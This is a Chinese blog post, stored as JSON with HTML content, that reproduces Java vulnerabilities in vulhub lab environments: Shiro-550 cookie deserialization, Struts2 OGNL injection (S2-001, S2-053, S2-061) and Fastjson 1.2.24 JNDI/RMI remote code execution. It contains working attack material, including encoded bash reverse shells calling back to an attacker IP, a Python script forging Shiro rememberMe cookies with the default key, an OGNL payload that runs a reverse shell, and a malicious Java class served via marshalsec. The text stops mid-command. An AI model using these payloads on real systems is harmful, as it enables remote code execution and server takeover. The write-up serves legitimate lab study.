{"title":"JAVA常见漏洞复现","uid":"d33a4e6758c9cb9a2d0afd329ce9632a","slug":"常见JAVA漏洞复现","date":"2023-04-20T07:02:30.000Z","updated":"2023-09-03T13:22:20.000Z","comments":true,"path":"api/articles/常见JAVA漏洞复现.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032121885.png","content":"<h1 id=\"Shiro\"><a href=\"#Shiro\" class=\"headerlink\" title=\"Shiro\"></a>Shiro</h1><h2 id=\"Shiro-550\"><a href=\"#Shiro-550\" class=\"headerlink\" title=\"Shiro 550\"></a>Shiro 550</h2><h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p><strong>Shiro550</strong>漏洞原理是Shiro框架提供了一种记住密码(Rememberme)的功能，用户登录成功后会生成经过加密的Cookie值，对Remembe的Cookie进行AES解密、Base64解密后再反序列化，就导致了反序列化RCE漏洞 。 Shiro&lt;1.2.4版本，其使用的密钥为固定密钥<code>Shiro550kPH+bIxk5D2deZiIxcaaaA==</code>，这就更容易导致RCE漏洞</p>\n<h3 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><p>用vulhub复现</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cd vulhub<span class=\"token operator\">/</span>shiro<span class=\"token operator\">/</span><span class=\"token constant\">CVE</span><span class=\"token operator\">-</span><span class=\"token number\">2016</span><span class=\"token operator\">-</span><span class=\"token number\">4437</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而后开启服务</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">docker<span class=\"token operator\">-</span>compose up <span class=\"token operator\">-</span>d \n<span class=\"token comment\">//-d是后台运行，加不加皆可</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304182332447.png\" alt=\"image-20230418233245340\"></p>\n<p>访问</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304182333517.png\" alt=\"image-20230418233350484\"></p>\n<h4 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><p>攻击端开启监听</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304182351556.png\" alt=\"image-20230418235121526\"></p>\n<p>而后构造反弹shell语句，在线生成编码后的反弹shell网站</p>\n<p><a href=\"https://ares-x.com/tools/runtime-exec\">https://ares-x.com/tools/runtime-exec</a></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">bash <span class=\"token operator\">-</span>c <span class=\"token punctuation\">&#123;</span>echo<span class=\"token punctuation\">,</span><span class=\"token class-name\">YmFzaCAtaSA</span><span class=\"token operator\">+</span><span class=\"token class-name\">JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ</span><span class=\"token operator\">==</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>base64<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>d<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>bash<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//bash -c &#123;echo,bash -i >&amp; /dev/tcp/192.168.1.129/6666 0>&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>而后通过<code>ysoserial</code>工具的JRMP监听6666端口并执行反弹shell指令</p>\n<p><strong>这里我们相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定 CommonsCollections5 利用链生成可执行bash -i &gt;&amp; /dev/tcp/192.168.200.131/6666 0&gt;&amp;1命令的序列化数据payload1。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload1。</strong></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">java <span class=\"token operator\">-</span>cp ysoserial<span class=\"token operator\">-</span>all<span class=\"token punctuation\">.</span>jar <span class=\"token class-name\"><span class=\"token namespace\">ysoserial<span class=\"token punctuation\">.</span>exploit<span class=\"token punctuation\">.</span></span>JRMPListener</span> <span class=\"token number\">7777</span> <span class=\"token class-name\">CommonsCollections5</span> <span class=\"token string\">\"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304190114110.png\" alt=\"image-20230419011409003\"></p>\n<p>接下来去利用密钥伪造<strong>rememberMe</strong>字段，脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> uuid\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> subprocess\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES\n<span class=\"token keyword\">def</span> <span class=\"token function\">encode_rememberme</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    popen <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>Popen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'java'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-jar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ysoserial-all.jar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'JRMPClient'</span><span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span>subprocess<span class=\"token punctuation\">.</span>PIPE<span class=\"token punctuation\">)</span>\n    BS <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>block_size\n    pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> s<span class=\"token punctuation\">:</span> s <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>BS <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> BS<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>BS <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> BS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    key <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"kPH+bIxk5D2deZiIxcaaaA==\"</span><span class=\"token punctuation\">)</span>\n    iv <span class=\"token operator\">=</span> uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">bytes</span>\n    encryptor <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span>\n    file_body <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>popen<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    base64_ciphertext <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>iv <span class=\"token operator\">+</span> encryptor<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>file_body<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> base64_ciphertext\n \n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    payload <span class=\"token operator\">=</span> encode_rememberme<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>   \n<span class=\"token keyword\">print</span> <span class=\"token string\">\"rememberMe=&#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>而后运行<strong>python2 shiro.py 192.168.1.129 7777</strong></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304191919487.png\" alt=\"image-20230419191959439\"></p>\n<p>接下来对网站进行抓包，在Cookie中添加我们伪造的<strong>rememberMe</strong>参数</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304191854922.png\" alt=\"image-20230419185428696\"></p>\n<p>此时查看，已成功反弹shell。</p>\n<h4 id=\"自动化工具\"><a href=\"#自动化工具\" class=\"headerlink\" title=\"自动化工具\"></a>自动化工具</h4><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304182344837.png\" alt=\"image-20230418234451793\"></p>\n<h2 id=\"Shiro-721\"><a href=\"#Shiro-721\" class=\"headerlink\" title=\"Shiro 721\"></a>Shiro 721</h2><h3 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p>  在用户进行登录的时候，Apache Shiro提供Rememberme功能，可以存储cookie，期间使用的是AES-128-CBC进行加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，重新请求网站，进行反序列化攻击，最终导致任意代码的执行。</p>\n<p>Shiro721是使用 登录后rememberMe= {value}去爆破正确的key值 进而反序列化，shiro721 本质上是 padding attack，爆破要弄很久。对比Shiro550条件只要有 足够密钥库 （条件较低）、Shiro721需要登录（要求较高 ）。</p>\n<h1 id=\"Struts2\"><a href=\"#Struts2\" class=\"headerlink\" title=\"Struts2\"></a>Struts2</h1><h2 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Struts2 漏洞的原理是由于 Struts2 框架中的一个组件，即 OGNL(Object-Graph Navigation Language) 表达式解析器，存在漏洞。OGNL 是一种强大的表达式语言，它允许开发人员在 Struts2 应用程序中使用动态表达式来访问和操作对象。但是，由于 OGNL 表达式解析器的实现不够安全，攻击者可以通过构造恶意 OGNL 表达式来执行任意代码。例如：<strong>当用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用<a href=\"https://so.csdn.net/so/search?q=OGNL&spm=1001.2101.3001.7020\">OGNL</a>表达式%{value}进行解析，然后重新填充到对应的表单数据中。</strong></p>\n<h2 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span><span class=\"token keyword\">do</span>或者 <span class=\"token punctuation\">.</span>action 的网站后缀<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"漏洞复现-1\"><a href=\"#漏洞复现-1\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><h4 id=\"s2-001\"><a href=\"#s2-001\" class=\"headerlink\" title=\"s2-001\"></a>s2-001</h4><p>使用Vuldb靶场进行复现</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">cd vulhub<span class=\"token operator\">/</span>struts2<span class=\"token operator\">/</span>s2<span class=\"token operator\">-</span><span class=\"token number\">001</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而后开启容器</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">docker<span class=\"token operator\">-</span>compose up <span class=\"token operator\">-</span>d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304191944829.png\" alt=\"image-20230419194425781\"></p>\n<p>输入**%{1+2}**，结果变成3</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304191946574.png\" alt=\"image-20230419194653538\"></p>\n<p>说明解析了，存在漏洞，查询tomact路径</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">%</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"tomcatBinDir&#123;\"</span><span class=\"token operator\">+</span><span class=\"token annotation punctuation\">@java.lang.System</span><span class=\"token annotation punctuation\">@getProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user.dir\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"&#125;\"</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304191956121.png\" alt=\"image-20230419195600069\"></p>\n<p>回显**tomcatBinDir{/usr/local/tomcat}**，成功实现命令执行</p>\n<h4 id=\"s2-053\"><a href=\"#s2-053\" class=\"headerlink\" title=\"s2-053\"></a>s2-053</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">cd vulhub<span class=\"token operator\">/</span>struts2<span class=\"token operator\">/</span>s2<span class=\"token operator\">-</span><span class=\"token number\">053</span>\ndocker<span class=\"token operator\">-</span>compose up <span class=\"token operator\">-</span>d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304192005806.png\" alt=\"image-20230419200514727\"></p>\n<p>访问环境<strong>hello.action</strong></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304192008701.png\" alt=\"image-20230419200833587\"></p>\n<p>接下来查看监听</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304192030836.png\" alt=\"image-20230419203040680\"></p>\n<h4 id=\"S2-061\"><a href=\"#S2-061\" class=\"headerlink\" title=\"S2-061\"></a>S2-061</h4><p>开启环境用vulhub</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">cd vulhub<span class=\"token operator\">/</span>struts2<span class=\"token operator\">/</span>s2<span class=\"token operator\">-</span><span class=\"token number\">061</span>\ndocker<span class=\"token operator\">-</span>compose up <span class=\"token operator\">-</span>d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>接下来抓包，而后修改为POST请求，发送反弹shell恶意指令</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token class-name\">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span>\n<span class=\"token class-name\">Content</span><span class=\"token operator\">-</span><span class=\"token class-name\">Disposition</span><span class=\"token operator\">:</span> form<span class=\"token operator\">-</span>data<span class=\"token punctuation\">;</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"id\"</span>\n\n<span class=\"token operator\">%</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">(</span>#instancemanager<span class=\"token operator\">=</span>#application<span class=\"token punctuation\">[</span><span class=\"token string\">\"org.apache.tomcat.InstanceManager\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#stack<span class=\"token operator\">=</span>#attr<span class=\"token punctuation\">[</span><span class=\"token string\">\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#bean<span class=\"token operator\">=</span>#instancemanager<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.apache.commons.collections.BeanMap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">setBean</span><span class=\"token punctuation\">(</span>#stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#context<span class=\"token operator\">=</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">setBean</span><span class=\"token punctuation\">(</span>#context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#macc<span class=\"token operator\">=</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"memberAccess\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">setBean</span><span class=\"token punctuation\">(</span>#macc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#emptyset<span class=\"token operator\">=</span>#instancemanager<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.util.HashSet\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"excludedClasses\"</span><span class=\"token punctuation\">,</span>#emptyset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#bean<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"excludedPackageNames\"</span><span class=\"token punctuation\">,</span>#emptyset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#arglist<span class=\"token operator\">=</span>#instancemanager<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.util.ArrayList\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#arglist<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#execute<span class=\"token operator\">=</span>#instancemanager<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"freemarker.template.utility.Execute\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>#execute<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>#arglist<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token operator\">--</span><span class=\"token class-name\">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><span class=\"token operator\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304192101081.png\" alt=\"image-20230419210122924\"></p>\n<h1 id=\"Fastjson\"><a href=\"#Fastjson\" class=\"headerlink\" title=\"Fastjson\"></a>Fastjson</h1><h2 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>目标网站在解析 json 时，未对 json 内容进行验证，直接将 json 解析成 java 对象并执行，这就给了攻击者可乘之机，构造对应的 payload ，让系统执行，然后达到代码执行，甚至命令执行的目的。</p>\n<p><strong>攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行</strong>。</p>\n<p>知识科普</p>\n<p><strong>JNDI是 Java 命名与目录接口（Java Naming and Directory  Interface），在J2EE规范中是重要的规范之一。JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI再局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</strong></p>\n<p><strong>RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。</strong></p>\n<p><strong>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java  远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并在目录中保存，当客户端使用lookup获取对应名字时，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。</strong></p>\n<h2 id=\"漏洞复现-2\"><a href=\"#漏洞复现-2\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">cd vulhub<span class=\"token operator\">/</span>fastjson<span class=\"token operator\">/</span><span class=\"token number\">1.2</span><span class=\"token number\">.24</span><span class=\"token operator\">-</span>rce\ndocker<span class=\"token operator\">-</span>compose up  <span class=\"token operator\">-</span>d<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>访问环境</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304200110470.png\" alt=\"image-20230420011047000\"></p>\n<p>在攻击机模拟json发送post请求</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">curl http<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span><span class=\"token number\">192.168</span><span class=\"token number\">.1</span><span class=\"token number\">.129</span><span class=\"token operator\">:</span><span class=\"token number\">8090</span><span class=\"token operator\">/</span> <span class=\"token operator\">-</span><span class=\"token class-name\">H</span> <span class=\"token string\">\"Content-Type: application/json\"</span> <span class=\"token operator\">--</span>data '<span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"name\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"karsa\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"age\"</span><span class=\"token operator\">:</span><span class=\"token number\">22</span><span class=\"token punctuation\">&#125;</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304200111176.png\" alt=\"image-20230420011156121\"></p>\n<p>验证漏洞存在，接下来去打</p>\n<p>首先编辑恶意java代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// javac TouchFile.java</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Runtime</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Process</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TouchFile</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">static</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token class-name\">Runtime</span> rt <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> commands <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"touch\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/tmp/success\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n            <span class=\"token class-name\">Process</span> pc <span class=\"token operator\">=</span> rt<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>commands<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            pc<span class=\"token punctuation\">.</span><span class=\"token function\">waitFor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token comment\">// do nothing</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对文件进行编译</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">javac <span class=\"token class-name\">TouchFile</span><span class=\"token punctuation\">.</span>java<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>搭建HTTP服务传输文件</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">python <span class=\"token operator\">-</span>m SimpleHTTPServer <span class=\"token number\">1387</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304200113576.png\" alt=\"image-20230420011353523\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304200117186.png\" alt=\"image-20230420011725129\"></p>\n<p>接下来利用java反序列化工具</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">git clone https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>github<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>mbechler<span class=\"token operator\">/</span>marshalsec<span class=\"token punctuation\">.</span>git 下载marshalsec\napt<span class=\"token operator\">-</span>get install maven 安装maven\nmvn clean <span class=\"token keyword\">package</span> <span class=\"token operator\">-</span><span class=\"token class-name\">DskipTests</span> 使用maven编译marshalsec成jar包<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>启动RMI服务器，监听9999端口</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">java <span class=\"token operator\">-</span>cp marshalsec<span class=\"token operator\">-</span><span class=\"token number\">0.0</span><span class=\"token number\">.3</span><span class=\"token operator\">-</span>SNAPSHOT<span class=\"token operator\">-</span>all<span class=\"token punctuation\">.</span>jar <span class=\"token class-name\"><span class=\"token namespace\">marshalsec<span class=\"token punctuation\">.</span>jndi<span class=\"token punctuation\">.</span></span>RMIRefServer</span> <span class=\"token string\">\"http://192.168.1.129:1387/#TouchFile\"</span> <span class=\"token 